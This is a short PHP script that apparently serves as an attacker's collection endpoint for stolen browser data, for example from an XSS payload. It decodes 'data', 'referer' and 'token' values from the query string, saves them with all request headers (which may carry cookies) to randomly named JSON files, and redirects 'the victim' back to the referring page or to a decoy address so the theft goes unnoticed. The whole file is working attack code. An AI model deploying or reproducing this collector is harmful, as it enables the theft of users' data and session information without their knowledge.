
<?php

	/* Variables */

		// Set the panic address to redirect the client to if they don't provide a valid referer address.
		$panic = "https://www.google.com/";

		$new_location;
		$callback = [ 
			"data"      => base64_decode($_GET["data"]), 
			"referer"   => base64_decode($_GET["referer"]), 
			"token"     => base64_decode($_GET["token"]), 
			"headers"   => getallheaders(), 
			"timestamp" => date( "Y-m-d H:i:s", time() ) 
		];

	/* Functions */

		function randomString($length) {
			$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			$buff  = "";

			while ( strlen($buff) < $length ) {
				$index = rand( 0, ( strlen($chars) - 1 ) );
				$buff .= $chars[$index];
			}

			return $buff;
		}

	/* Events */

		// Save sniffed data.
		try {
			file_put_contents( "./callback-" . randomString(9) . ".json", json_encode($callback, true) );
		} catch (Exception $ignore) {}

		// Check if valid referer is provided.
		if ( preg_match_all("/http[s]?:\/\/[a-z0-9]/i", $callback["referer"]) ) {
			$new_location = $callback["referer"];
		} else if ( preg_match_all("/http[s]?:\/\/[a-z0-9]/i", $callback["headers"]["Referer"]) ) {
			$new_location = $callback["headers"]["Referer"];
		} else {
			$new_location = $panic;
		}

		// Add token to referer address.
		if ($new_location != $panic) {
			if ( preg_match_all("/#.*$/", $new_location ) ) {
				$new_location = preg_replace("/#.*$/", "#" . $callback["token"], $new_location);
			} else {
				$new_location .= "#" . $callback["token"];
			}
		}

		// Redirect the victim.
		http_response_code(301);
		header("Location: " . $new_location);

?>
